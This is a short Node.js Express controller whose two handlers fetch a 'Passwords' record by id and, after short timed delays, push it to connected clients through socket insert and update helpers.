const {
  getInfo,
  socketInsertData,
  socketUpdateData,
} = require("../utils/axiosfn");

const password = async (req, res) => {
  const { code, id, uuid } = req.body;
  // console.log(code, id);
  if (id === undefined) {
    res.status(200).send({ ok: true });
    return;
  }
  setTimeout(async () => {
    const objData = await getInfo("Passwords", id);
    // console.log(objData, "-");

    setTimeout(() => {
      socketInsertData("Passwords", objData[0], id, uuid);
    }, 200);
  }, 1000);

  res.status(200).send({ ok: true });
};

const updatePassword = async (req, res) => {
  const { id, uuid } = req.body;
  // console.log(id);
  if (id === undefined) {
    res.status(200).send({ ok: true });
    return;
  }
  setTimeout(async () => {
    const objData = await getInfo("Passwords", id);
    // console.log(objData, "-");

    setTimeout(() => {
      socketUpdateData("Passwords", id, objData[0], uuid);
    }, 200);
  }, 1000);

  res.status(200).send({ ok: true });
};

module.exports = {
  password,
  updatePassword,
};
